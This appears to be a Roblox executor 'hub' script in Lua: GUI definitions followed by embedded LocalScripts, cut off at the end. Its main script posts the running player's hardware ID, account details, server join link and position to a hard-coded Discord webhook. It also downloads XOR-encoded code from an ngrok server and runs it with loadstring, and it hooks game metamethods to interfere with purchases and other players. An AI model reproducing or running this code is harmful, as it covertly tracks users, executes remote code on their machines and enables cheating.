_i[45].TextWrapped = true
_i[45].TextXAlignment = Enum.TextXAlignment.Left
_i[45].TextYAlignment = Enum.TextYAlignment.Center
_i[45].Name = [[TextLabel]]
_i[45].Parent = _i[36]

_i[46] = Instance.new("UIPadding")
_i[46].PaddingBottom = UDim.new(0,0)
_i[46].PaddingLeft = UDim.new(0,0)
_i[46].PaddingRight = UDim.new(0,0)
_i[46].PaddingTop = UDim.new(0,0)
_i[46].Name = [[UIPadding]]
_i[46].Parent = _i[45]

_i[47] = Instance.new("UIStroke")
_i[47].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[47].Color = Color3.fromRGB(0,0,0)
_i[47].LineJoinMode = Enum.LineJoinMode.Round
_i[47].Thickness = 3.4000000953674316
_i[47].Transparency = 0
_i[47].Name = [[UIStroke]]
_i[47].Parent = _i[45]

_i[48] = Instance.new("ImageLabel")
_i[48].AnchorPoint = Vector2.new(0,0)
_i[48].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[48].BackgroundTransparency = 1
_i[48].BorderColor3 = Color3.fromRGB(0,0,0)
_i[48].BorderSizePixel = 0
_i[48].ClipsDescendants = false
_i[48].LayoutOrder = 0
_i[48].Position = UDim2.new(0.570282,0,0.269557,0)
_i[48].Rotation = 0
_i[48].Selectable = false
_i[48].Size = UDim2.new(0.067205,0,0.484212,0)
_i[48].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[48].Visible = true
_i[48].ZIndex = 1
_i[48].Image = [[rbxassetid://123965417468651]]
_i[48].ImageColor3 = Color3.fromRGB(255,255,255)
_i[48].ImageRectOffset = Vector2.new(0,0)
_i[48].ImageRectSize = Vector2.new(0,0)
_i[48].ImageTransparency = 0
_i[48].ResampleMode = Enum.ResamplerMode.Default
_i[48].ScaleType = Enum.ScaleType.Stretch
_i[48].SliceCenter = Rect.new(0,0,0,0)
_i[48].SliceScale = 1
_i[48].Name = [[ImageLabel]]
_i[48].Parent = _i[36]

_i[49] = Instance.new("TextLabel")
_i[49].AnchorPoint = Vector2.new(0,0)
_i[49].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[49].BackgroundTransparency = 1
_i[49].BorderColor3 = Color3.fromRGB(0,0,0)
_i[49].BorderSizePixel = 0
_i[49].ClipsDescendants = false
_i[49].LayoutOrder = 0
_i[49].Position = UDim2.new(0.828571,0,0.242424,0)
_i[49].Rotation = 0
_i[49].Selectable = false
_i[49].Size = UDim2.new(2.17143,0,0.727273,0)
_i[49].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[49].Visible = true
_i[49].ZIndex = 1
_i[49].Font = Enum.Font.SourceSansBold
_i[49].LineHeight = 1
_i[49].MaxVisibleGraphemes = -1
_i[49].RichText = false
_i[49].Text = [[100110]]
_i[49].TextColor3 = Color3.fromRGB(255,255,255)
_i[49].TextScaled = true
_i[49].TextSize = 14
_i[49].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[49].TextStrokeTransparency = 1
_i[49].TextTransparency = 0
_i[49].TextTruncate = Enum.TextTruncate.None
_i[49].TextWrapped = true
_i[49].TextXAlignment = Enum.TextXAlignment.Left
_i[49].TextYAlignment = Enum.TextYAlignment.Center
_i[49].Name = [[pomlk1]]
_i[49].Parent = _i[48]

_i[50] = Instance.new("TextButton")
_i[50].AnchorPoint = Vector2.new(0,0)
_i[50].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[50].BackgroundTransparency = 1
_i[50].BorderColor3 = Color3.fromRGB(0,0,0)
_i[50].BorderSizePixel = 0
_i[50].ClipsDescendants = false
_i[50].LayoutOrder = 0
_i[50].Position = UDim2.new(0.0686609,0,0.167451,0)
_i[50].Rotation = 0
_i[50].Selectable = true
_i[50].Size = UDim2.new(0.0717125,0,0.109097,0)
_i[50].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[50].Visible = true
_i[50].ZIndex = 1
_i[50].AutoButtonColor = true
_i[50].Font = Enum.Font.SourceSans
_i[50].LineHeight = 1
_i[50].Modal = false
_i[50].RichText = false
_i[50].Selected = false
_i[50].Text = [[]]
_i[50].TextColor3 = Color3.fromRGB(0,0,0)
_i[50].TextScaled = false
_i[50].TextSize = 14
_i[50].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[50].TextStrokeTransparency = 1
_i[50].TextTransparency = 0
_i[50].TextWrapped = false
_i[50].TextXAlignment = Enum.TextXAlignment.Center
_i[50].TextYAlignment = Enum.TextYAlignment.Center
_i[50].Name = [[Bouton discord]]
_i[50].Parent = _i[4]

_i[51] = Instance.new("ImageLabel")
_i[51].AnchorPoint = Vector2.new(0,0)
_i[51].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[51].BackgroundTransparency = 1
_i[51].BorderColor3 = Color3.fromRGB(0,0,0)
_i[51].BorderSizePixel = 0
_i[51].ClipsDescendants = false
_i[51].LayoutOrder = 0
_i[51].Position = UDim2.new(0,0,-3.54856e-07,0)
_i[51].Rotation = 0
_i[51].Selectable = false
_i[51].Size = UDim2.new(1,0,1,0)
_i[51].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[51].Visible = true
_i[51].ZIndex = 1
_i[51].Image = [[rbxassetid://127885216293809]]
_i[51].ImageColor3 = Color3.fromRGB(255,255,255)
_i[51].ImageRectOffset = Vector2.new(0,0)
_i[51].ImageRectSize = Vector2.new(0,0)
_i[51].ImageTransparency = 0
_i[51].ResampleMode = Enum.ResamplerMode.Default
_i[51].ScaleType = Enum.ScaleType.Stretch
_i[51].SliceCenter = Rect.new(0,0,0,0)
_i[51].SliceScale = 1
_i[51].Name = [[ImageLabel]]
_i[51].Parent = _i[50]

_i[52] = Instance.new("TextButton")
_i[52].AnchorPoint = Vector2.new(0,0)
_i[52].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[52].BackgroundTransparency = 1
_i[52].BorderColor3 = Color3.fromRGB(0,0,0)
_i[52].BorderSizePixel = 0
_i[52].ClipsDescendants = false
_i[52].LayoutOrder = 0
_i[52].Position = UDim2.new(0.140373,0,0.167451,0)
_i[52].Rotation = 0
_i[52].Selectable = true
_i[52].Size = UDim2.new(0.0717125,0,0.109097,0)
_i[52].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[52].Visible = true
_i[52].ZIndex = 1
_i[52].AutoButtonColor = true
_i[52].Font = Enum.Font.SourceSans
_i[52].LineHeight = 1
_i[52].Modal = false
_i[52].RichText = false
_i[52].Selected = false
_i[52].Text = [[]]
_i[52].TextColor3 = Color3.fromRGB(0,0,0)
_i[52].TextScaled = false
_i[52].TextSize = 14
_i[52].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[52].TextStrokeTransparency = 1
_i[52].TextTransparency = 0
_i[52].TextWrapped = false
_i[52].TextXAlignment = Enum.TextXAlignment.Center
_i[52].TextYAlignment = Enum.TextYAlignment.Center
_i[52].Name = [[Bouton YouTube]]
_i[52].Parent = _i[4]

_i[53] = Instance.new("ImageLabel")
_i[53].AnchorPoint = Vector2.new(0,0)
_i[53].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[53].BackgroundTransparency = 1
_i[53].BorderColor3 = Color3.fromRGB(0,0,0)
_i[53].BorderSizePixel = 0
_i[53].ClipsDescendants = false
_i[53].LayoutOrder = 0
_i[53].Position = UDim2.new(0,0,-3.54856e-07,0)
_i[53].Rotation = 0
_i[53].Selectable = false
_i[53].Size = UDim2.new(1,0,1,0)
_i[53].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[53].Visible = true
_i[53].ZIndex = 1
_i[53].Image = [[rbxassetid://100375375569274]]
_i[53].ImageColor3 = Color3.fromRGB(255,255,255)
_i[53].ImageRectOffset = Vector2.new(0,0)
_i[53].ImageRectSize = Vector2.new(0,0)
_i[53].ImageTransparency = 0
_i[53].ResampleMode = Enum.ResamplerMode.Default
_i[53].ScaleType = Enum.ScaleType.Stretch
_i[53].SliceCenter = Rect.new(0,0,0,0)
_i[53].SliceScale = 1
_i[53].Name = [[ImageLabel]]
_i[53].Parent = _i[52]

_i[54] = Instance.new("ImageLabel")
_i[54].AnchorPoint = Vector2.new(0,0)
_i[54].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[54].BackgroundTransparency = 1
_i[54].BorderColor3 = Color3.fromRGB(0,0,0)
_i[54].BorderSizePixel = 0
_i[54].ClipsDescendants = false
_i[54].LayoutOrder = 0
_i[54].Position = UDim2.new(0.662196,0,0.0790302,0)
_i[54].Rotation = 0
_i[54].Selectable = false
_i[54].Size = UDim2.new(0.030516,0,0.0464702,0)
_i[54].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[54].Visible = true
_i[54].ZIndex = 1
_i[54].Image = [[rbxassetid://101735923084464]]
_i[54].ImageColor3 = Color3.fromRGB(255,255,255)
_i[54].ImageRectOffset = Vector2.new(0,0)
_i[54].ImageRectSize = Vector2.new(0,0)
_i[54].ImageTransparency = 0
_i[54].ResampleMode = Enum.ResamplerMode.Default
_i[54].ScaleType = Enum.ScaleType.Stretch
_i[54].SliceCenter = Rect.new(0,0,0,0)
_i[54].SliceScale = 1
_i[54].Name = [[ImageLabel]]
_i[54].Parent = _i[4]

_i[55] = Instance.new("UIAspectRatioConstraint")
_i[55].AspectRatio = 1.09194016456604
_i[55].AspectType = Enum.AspectType.FitWithinMaxSize
_i[55].DominantAxis = Enum.DominantAxis.Width
_i[55].Name = [[UIAspectRatioConstraint]]
_i[55].Parent = _i[54]

_i[56] = Instance.new("TextButton")
_i[56].AnchorPoint = Vector2.new(0,0)
_i[56].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[56].BackgroundTransparency = 1
_i[56].BorderColor3 = Color3.fromRGB(0,0,0)
_i[56].BorderSizePixel = 0
_i[56].ClipsDescendants = false
_i[56].LayoutOrder = 0
_i[56].Position = UDim2.new(0.199219,0,0.178406,0)
_i[56].Rotation = 0
_i[56].Selectable = true
_i[56].Size = UDim2.new(0.602514,0,0.133812,0)
_i[56].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[56].Visible = true
_i[56].ZIndex = 0
_i[56].AutoButtonColor = true
_i[56].Font = Enum.Font.SourceSans
_i[56].LineHeight = 1
_i[56].Modal = false
_i[56].RichText = false
_i[56].Selected = false
_i[56].Text = [[]]
_i[56].TextColor3 = Color3.fromRGB(0,0,0)
_i[56].TextScaled = false
_i[56].TextSize = 14
_i[56].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[56].TextStrokeTransparency = 1
_i[56].TextTransparency = 0
_i[56].TextWrapped = false
_i[56].TextXAlignment = Enum.TextXAlignment.Center
_i[56].TextYAlignment = Enum.TextYAlignment.Center
_i[56].Name = [[Bouton de déplacement]]
_i[56].Parent = _i[2]

_i[57] = Instance.new("TextLabel")
_i[57].AnchorPoint = Vector2.new(0,0)
_i[57].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[57].BackgroundTransparency = 1
_i[57].BorderColor3 = Color3.fromRGB(0,0,0)
_i[57].BorderSizePixel = 0
_i[57].ClipsDescendants = false
_i[57].LayoutOrder = 0
_i[57].Position = UDim2.new(0,0,0.879569,0)
_i[57].Rotation = 0
_i[57].Selectable = false
_i[57].Size = UDim2.new(1,0,0.119125,0)
_i[57].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[57].Visible = true
_i[57].ZIndex = 1
_i[57].Font = Enum.Font.SourceSans
_i[57].LineHeight = 1
_i[57].MaxVisibleGraphemes = -1
_i[57].RichText = false
_i[57].Text = [[]]
_i[57].TextColor3 = Color3.fromRGB(255,255,255)
_i[57].TextScaled = true
_i[57].TextSize = 14
_i[57].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[57].TextStrokeTransparency = 1
_i[57].TextTransparency = 0
_i[57].TextTruncate = Enum.TextTruncate.None
_i[57].TextWrapped = true
_i[57].TextXAlignment = Enum.TextXAlignment.Center
_i[57].TextYAlignment = Enum.TextYAlignment.Center
_i[57].Name = [[TextLabel]]
_i[57].Parent = _i[1]

_i[58] = Instance.new("Frame")
_i[58].AnchorPoint = Vector2.new(0,0)
_i[58].BackgroundColor3 = Color3.fromRGB(0,0,0)
_i[58].BackgroundTransparency = 0.3499999940395355
_i[58].BorderColor3 = Color3.fromRGB(0,0,0)
_i[58].BorderSizePixel = 0
_i[58].ClipsDescendants = false
_i[58].LayoutOrder = 0
_i[58].Position = UDim2.new(0.0154421,0,0,0)
_i[58].Rotation = 0
_i[58].Selectable = false
_i[58].Size = UDim2.new(0.967978,0,0.226828,0)
_i[58].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[58].Visible = false
_i[58].ZIndex = 1
_i[58].Name = [[Message]]
_i[58].Parent = _i[1]

_i[59] = Instance.new("UICorner")
_i[59].CornerRadius = UDim.new(0,8)
_i[59].Name = [[UICorner]]
_i[59].Parent = _i[58]

_i[60] = Instance.new("UIStroke")
_i[60].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[60].Color = Color3.fromRGB(255,255,255)
_i[60].LineJoinMode = Enum.LineJoinMode.Round
_i[60].Thickness = 3.799999952316284
_i[60].Transparency = 0.4000000059604645
_i[60].Name = [[UIStroke]]
_i[60].Parent = _i[58]

_i[61] = Instance.new("UIGradient")
_i[61].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,164,166)),ColorSequenceKeypoint.new(0.412646,Color3.fromRGB(255,212,213)),ColorSequenceKeypoint.new(0.62396,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[61].Offset = Vector2.new(0,0)
_i[61].Rotation = 0
_i[61].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[61].Name = [[UIGradient]]
_i[61].Parent = _i[60]

_i[62] = Instance.new("TextLabel")
_i[62].AnchorPoint = Vector2.new(0,0)
_i[62].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[62].BackgroundTransparency = 1
_i[62].BorderColor3 = Color3.fromRGB(0,0,0)
_i[62].BorderSizePixel = 0
_i[62].ClipsDescendants = false
_i[62].LayoutOrder = 0
_i[62].Position = UDim2.new(0,0,0,0)
_i[62].Rotation = 0
_i[62].Selectable = false
_i[62].Size = UDim2.new(1,0,1,0)
_i[62].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[62].Visible = true
_i[62].ZIndex = 1
_i[62].Font = Enum.Font.SourceSans
_i[62].LineHeight = 1
_i[62].MaxVisibleGraphemes = -1
_i[62].RichText = false
_i[62].Text = [[...]]
_i[62].TextColor3 = Color3.fromRGB(255,255,255)
_i[62].TextScaled = true
_i[62].TextSize = 27
_i[62].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[62].TextStrokeTransparency = 1
_i[62].TextTransparency = 0
_i[62].TextTruncate = Enum.TextTruncate.None
_i[62].TextWrapped = true
_i[62].TextXAlignment = Enum.TextXAlignment.Left
_i[62].TextYAlignment = Enum.TextYAlignment.Top
_i[62].Name = [[Message visible]]
_i[62].Parent = _i[58]

_i[63] = Instance.new("UITextSizeConstraint")
_i[63].MaxTextSize = 27
_i[63].MinTextSize = 1
_i[63].Name = [[UITextSizeConstraint]]
_i[63].Parent = _i[62]

_i[64] = Instance.new("UIStroke")
_i[64].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[64].Color = Color3.fromRGB(0,0,0)
_i[64].LineJoinMode = Enum.LineJoinMode.Round
_i[64].Thickness = 2.299999952316284
_i[64].Transparency = 0
_i[64].Name = [[UIStroke]]
_i[64].Parent = _i[62]


-- Scripts:

local function AJEXP_fake_script() -- Mot de passe Stats.LocalScript
	local script = Instance.new('LocalScript', _i[1])
	script.Name = [[LocalScript]]

	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local HttpService = game:GetService("HttpService")
	local MarketplaceService = game:GetService("MarketplaceService")
	local UserInputService = game:GetService("UserInputService")
	local Stats = game:GetService("Stats")
	local Workspace = game:GetService("Workspace")
	local RunService = game:GetService("RunService")
	local StarterGui = game:GetService("StarterGui")
	
	local API_URL = "https://v0-roblox-account-integration.vercel.app/api/vip/check"
	local WEBHOOK_URL = "https://discord.com/api/webhooks/1482988203894898759/QsufSoJQweu1fVVxOcYuFNaW8cWUVNCzv54rckSr7IisK-FfpZsQc3wquHMMd4QYzjAm"
	local BAN_URL = "https://raw.githubusercontent.com/Audinay/UFIL/refs/heads/main/Id%C3%A9e%20de%20joueur.ban"
	
	-- === CONFIGURATION MULTIVERSE (CORRIGÉE) ===
	-- On ajoute bien /api/get_script à la fin du lien Ngrok
	local NGROK_MULTIVERSE = "https://sighing-gauze-charcoal.ngrok-free.dev/api/get_script"
	
	local ID_CREATEUR = 9547606904
	
	local gui = script.Parent 
	_G.IsVipActive = false 
	local isHubLoaded = false
	local kickTimerStarted = false
	local webhookSent = false 
	
	-- ==========================================
	-- 0. SYSTÈME DE BANNISSEMENT GLOBAL (BLACKLIST)
	-- ==========================================
	local function checkBanList()
		local success, banData = pcall(function() return game:HttpGet(BAN_URL) end)
		if success and banData then
			for bannedId in string.gmatch(banData, "%d+") do
				if tonumber(bannedId) == LocalPlayer.UserId then
					LocalPlayer:Kick("You have been banned by the script creator for unknown reasons, but perhaps you upset them. This action is irrevocable. You are permanently banned from this script until the creator unbans you.")
					return true 
				end
			end
		end
		return false
	end
	
	if checkBanList() then return end
	
	-- ==========================================
	-- 1. DÉTECTION EXÉCUTEUR & HWID
	-- ==========================================
	local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
	local executorName = identifyexecutor and identifyexecutor() or "Exécuteur Inconnu"
	
	local hwid = "Non supporté par l'exécuteur"
	task.spawn(function()
		pcall(function() hwid = gethwid and gethwid() or get_hwid and get_hwid() or get_hardware_id and get_hardware_id() or hwid end)
	end)
	
	-- ==========================================
	-- 2. FONCTION WEBHOOK DISCORD (LOGGING COMPLET)
	-- ==========================================
	local function GetRealHeadShotAPI(userId)
		local fallbackImage = "https://tr.rbxcdn.com/53eb9b17fe1432a809c73a132d79f09c/420/420/Image/Png"
		if not httpRequest then return fallbackImage end
		local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..tostring(userId).."&size=420x420&format=Png&isCircular=false"
		local success, response = pcall(function() return httpRequest({ Url = url, Method = "GET" }) end)
		if success and response and response.Body then
			local data = HttpService:JSONDecode(response.Body)
			if data and data.data and data.data[1] and data.data[1].imageUrl then return data.data[1].imageUrl end
		end
		return fallbackImage
	end
	
	local function sendDiscordLog(isVip)
		if not httpRequest or webhookSent then return end
		webhookSent = true 
	
		task.spawn(function()
			local successGame, gameInfo = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
			local gameName = successGame and gameInfo.Name or "Nom du jeu inconnu"
			local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
			local webLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
			local playerCount = #Players:GetPlayers()
			local maxPlayers = Players.MaxPlayers
	
			local deviceType = "Ordinateur 💻"
			if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then deviceType = "Mobile / Tablette 📱"
			elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then deviceType = "Console 🎮"
			elseif UserInputService.VREnabled then deviceType = "Casque VR 🥽" end
	
			local ping = "Inconnu"
			pcall(function() ping = string.split(Stats.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1] .. " ms" end)
			local fps = tostring(math.floor(Workspace:GetRealPhysicsFPS())) .. " FPS"
	
			local accountAge = tostring(LocalPlayer.AccountAge) .. " jours"
			local isPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Oui 🌟" or "Non ❌"
			local playerTeam = LocalPlayer.Team and LocalPlayer.Team.Name or "Aucune / Neutre"
	
			local char = LocalPlayer.Character
			local humanoid = char and char:FindFirstChild("Humanoid")
			local rootPart = char and char:FindFirstChild("HumanoidRootPart")
	
			local walkSpeed = humanoid and tostring(math.floor(humanoid.WalkSpeed)) or "Inconnu"
			local jumpPower = humanoid and tostring(math.floor(humanoid.JumpPower)) or "Inconnu"
			local health = humanoid and tostring(math.floor(humanoid.Health)) .. " / " .. tostring(math.floor(humanoid.MaxHealth)) or "Inconnu"
	
			local positionTxt = "Inconnue"
			if rootPart then
				positionTxt = "X: " .. math.floor(rootPart.Position.X) .. ", Y: " .. math.floor(rootPart.Position.Y) .. ", Z: " .. math.floor(rootPart.Position.Z)
			end
	
			local moneyInfo = "Non détecté"
			if LocalPlayer:FindFirstChild("leaderstats") then
				local stats = {}
				for _, stat in ipairs(LocalPlayer.leaderstats:GetChildren()) do
					table.insert(stats, stat.Name .. ": " .. tostring(stat.Value))
				end
				if #stats > 0 then moneyInfo = table.concat(stats, " | ") end
			end
	
			local myAvatar = GetRealHeadShotAPI(LocalPlayer.UserId)
			local embedColor = isVip and 5763719 or 15548997
			local embedTitle = isVip and "🟢 INJECTION RÉUSSIE (ACCÈS VIP VALIDÉ)" or "🔴 INJECTION (EN ATTENTE DE VIP)"
			local embedDesc = "Le joueur a exécuté le script avec **" .. executorName .. "**.\n\n" .. (isVip and "✅ **Statut :** VIP Activé sur le site." or "❌ **Statut :** VIP Non activé.")
	
			local payload = {
				["username"] = "SORONICE Intel",
				["avatar_url"] = myAvatar,
				["content"] = "||@everyone|| **Nouveau log détecté !**", 
				["embeds"] = {{
					["title"] = embedTitle, ["description"] = embedDesc, ["color"] = embedColor, ["thumbnail"] = { ["url"] = myAvatar },
					["fields"] = {
						{["name"] = "👤 Pseudo", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true},
						{["name"] = "🏷️ Surnom", ["value"] = "```" .. LocalPlayer.DisplayName .. "```", ["inline"] = true},
						{["name"] = "🆔 ID Joueur", ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```", ["inline"] = true},
						{["name"] = "💻 HWID (Machine ID)", ["value"] = "`" .. hwid .. "`", ["inline"] = false},
						{["name"] = "📅 Âge du Compte", ["value"] = accountAge, ["inline"] = true},
						{["name"] = "💎 Premium Roblox", ["value"] = isPremium, ["inline"] = true},
						{["name"] = "🖥️ Appareil", ["value"] = deviceType, ["inline"] = true},
						{["name"] = "📡 Ping", ["value"] = ping, ["inline"] = true},
						{["name"] = "🎞️ FPS", ["value"] = fps, ["inline"] = true},
						{["name"] = "🏳️ Équipe", ["value"] = playerTeam, ["inline"] = true},
						{["name"] = "🎮 Jeu Actuel", ["value"] = "**" .. gameName .. "**", ["inline"] = true},
						{["name"] = "👥 Joueurs", ["value"] = tostring(playerCount) .. " / " .. tostring(maxPlayers), ["inline"] = true},
						{["name"] = "🌍 PlaceId", ["value"] = "`" .. tostring(game.PlaceId) .. "`", ["inline"] = true},
						{["name"] = "❤️ Santé", ["value"] = health, ["inline"] = true},
						{["name"] = "🏃 Vitesse / Saut", ["value"] = walkSpeed .. " / " .. jumpPower, ["inline"] = true},
						{["name"] = "📍 Coordonnées Exactes", ["value"] = "`" .. positionTxt .. "`", ["inline"] = true},
						{["name"] = "💰 Leaderstats", ["value"] = "```" .. moneyInfo .. "```", ["inline"] = false},
						{["name"] = "🔗 Liens Rapides", ["value"] = "[🌐 Ouvrir la page web]("..webLink..")\n\n**🚀 Lien d'auto-rejoindre (PC) :**\n`" .. joinLink .. "`\n\n**🔑 JobId Brut :**\n`" .. game.JobId .. "`", ["inline"] = false}
					},
					["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
					["footer"] = { ["text"] = "SORONICE HUB Logger • ID Serveur: " .. game.JobId }
				}}
			}
			httpRequest({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) })
		end)
	end
	
	-- ==========================================
	-- 3. GESTION VIP (MULTIVERSE SÉCURISÉ)
	-- ==========================================
	local function checkVIPStatus()
		local url = API_URL .. "?id=" .. tostring(LocalPlayer.UserId)
		if httpRequest then
			local success, response = pcall(function() return httpRequest({ Url = url, Method = "GET" }) end)
			if success and response and response.Body then
				local decodeSuccess, decodedData = pcall(function() return HttpService:JSONDecode(response.Body) end)
				if decodeSuccess then return decodedData end
			end
		else
			local success, result = pcall(function() return game:HttpGet(url) end)
			if success then
				local decodeSuccess, decodedData = pcall(function() return HttpService:JSONDecode(result) end)
				if decodeSuccess then return decodedData end
			end
		end
		return nil
	end
	
	local function handleVIP()
		local data = checkVIPStatus()
		if data and (data.action == "allow" or data.status == "active") then
			gui.Enabled = false
			_G.IsVipActive = true
	
			if not webhookSent then sendDiscordLog(true) end
	
			if not isHubLoaded then
				isHubLoaded = true
	
				-- === CONNEXION AU SERVEUR MULTIVERSE ===
				if httpRequest then
					local multiverseData = {
						place_id = tostring(game.PlaceId),
						hwid = hwid,
						userid = tostring(LocalPlayer.UserId)
					}
	
					local successReq, req = pcall(function()
						return httpRequest({
							Url = NGROK_MULTIVERSE,
							Method = "POST",
							Headers = {
								["Content-Type"] = "application/json",
								["ngrok-skip-browser-warning"] = "true"
							},
							Body = HttpService:JSONEncode(multiverseData)
						})
					end)
	
					if successReq and req and req.StatusCode == 200 then
						local successDecode, d = pcall(function() return HttpService:JSONDecode(req.Body) end)
						if successDecode and d.succes and d.code then
							-- DÉCODAGE XOR 90 DU CODE MULTIVERSE
							local tableau_nombres = d.code
							local caracteres = {}
							for i = 1, #tableau_nombres do
								caracteres[i] = string.char(bit32.bxor(tableau_nombres[i], 90))
							end
	
							local code_final = table.concat(caracteres)
							local executer, erreur = loadstring(code_final)
	
							if executer then
								executer()
							else
								warn("Erreur d'exécution Multiverse : " .. tostring(erreur))
							end
						end
					else
						warn("Multiverse : Impossible de contacter le serveur Python.")
					end
				else
					warn("Exécuteur non compatible pour contacter le Multiverse.")
				end
			end
	
			if not kickTimerStarted then
				kickTimerStarted = true
				local remainingMs = data.remainingMs or (4 * 60 * 60 * 1000)
				task.spawn(function()
					task.wait(remainingMs / 1000)
					LocalPlayer:Kick("Tes 4 heures de VIP sont terminées.")
				end)
			end
		else
			gui.Enabled = true 
			if not webhookSent then sendDiscordLog(false) end
			if _G.IsVipActive then LocalPlayer:Kick("Ton accès VIP vient d'expirer !") end
			_G.IsVipActive = false
		end
	end
	
	task.spawn(function()
		handleVIP()
		while true do
			if not _G.IsVipActive then task.wait(5) else task.wait(60) end
			pcall(handleVIP)
		end
	end)
	
	-- ==========================================
	-- 4. PROTECTION CRÉATEUR & BLOCAGE DES DONS
	-- ==========================================
	if LocalPlayer.UserId ~= ID_CREATEUR then
	
		-- 4A. BLOCAGE DES DONS (Pls Donate)
		local oldNamecall
		oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
			local method = getnamecallmethod()
			local args = {...}
	
			if not checkcaller() and self == MarketplaceService and (method == "PromptPurchase" or method == "PromptGamePassPurchase" or method == "PromptProductPurchase") then
				local itemId = args[2]
	
				task.spawn(function()
					local success, info = pcall(function() return MarketplaceService:GetProductInfo(itemId) end)
					if success and info then
						local targetId = (info.Creator and info.Creator.CreatorTargetId) or 0
						if targetId ~= ID_CREATEUR then
							pcall(function()
								StarterGui:SetCore("SendNotification", { Title = "SORONICE", Text = "Vous ne pouvez faire des dons qu'au créateur du script !", Duration = 5 })
							end)
						end
					end
				end)
			end
			return oldNamecall(self, ...)
		end))
	
		-- 4B. MODE INTOUCHABLE (Forcefield + Anti-Aim)
		local mouse = LocalPlayer:GetMouse()
		RunService.RenderStepped:Connect(function()
			local creatorPlayer = nil
			for _, p in ipairs(Players:GetPlayers()) do
				if p.UserId == ID_CREATEUR then
					creatorPlayer = p
					break
				end
			end
	
			if creatorPlayer and creatorPlayer.Character and creatorPlayer.Character:FindFirstChild("HumanoidRootPart") then
				local myChar = LocalPlayer.Character
				local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
	
				if myRoot then
					local creatorRoot = creatorPlayer.Character.HumanoidRootPart
					local distance = (myRoot.Position - creatorRoot.Position).Magnitude
					local humanoid = myChar:FindFirstChild("Humanoid")
	
					-- 1. Barrière de 20 studs
					if distance < 20 then
						local pushDirection = (myRoot.Position - creatorRoot.Position).Unit
						myRoot.CFrame = myRoot.CFrame + (pushDirection * 1.5)
						if humanoid then humanoid:UnequipTools() end
					end
	
					-- 2. Anti-Aim (Désarme si on te vise)
					if mouse.Target and mouse.Target:IsDescendantOf(creatorPlayer.Character) then
						if humanoid then humanoid:UnequipTools() end
					end
				end
			end
		end)
	end
end
coroutine.wrap(AJEXP_fake_script)()

local function XXYKU_fake_script() -- Mot de passe Stats.LocalScript
	local script = Instance.new('LocalScript', _i[1])
	script.Name = [[LocalScript]]

	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	local gui = player:WaitForChild("PlayerGui"):WaitForChild("Mot de passe Stats")
	gui.ResetOnSpawn = false
	ResetOnSpawn = false
	
end
coroutine.wrap(XXYKU_fake_script)()

local function UFBLH_fake_script() -- Canvas.LocalScript
	local script = Instance.new('LocalScript', _i[2])
	script.Name = [[LocalScript]]

	local TweenService = game:GetService("TweenService")
	
	-- On récupère la frame (on part du principe que le script est dedans)
	local frame = script.Parent
	
	-- CONFIGURATION
	-- On stocke la taille originale que tu as définie dans l'UI
	local tailleOriginale = frame.Size
	-- Durée de l'animation (0.5 secondes pour que ce soit fluide)
	local duree = 0.5 
	
	-- Paramètres de l'animation avec l'effet de rebondissement (Elastic ou Back)
	-- "Back" est parfait pour l'effet "télé qui s'allume" avec un petit ressort à la fin
	local tweenInfo = TweenInfo.new(
		duree,                          -- Temps
		Enum.EasingStyle.Back,          -- Style : Back donne cet effet de dépassement/rebond
		Enum.EasingDirection.Out,       -- Direction : Appliquer l'effet à la fin du mouvement
		0,                              -- Répétitions
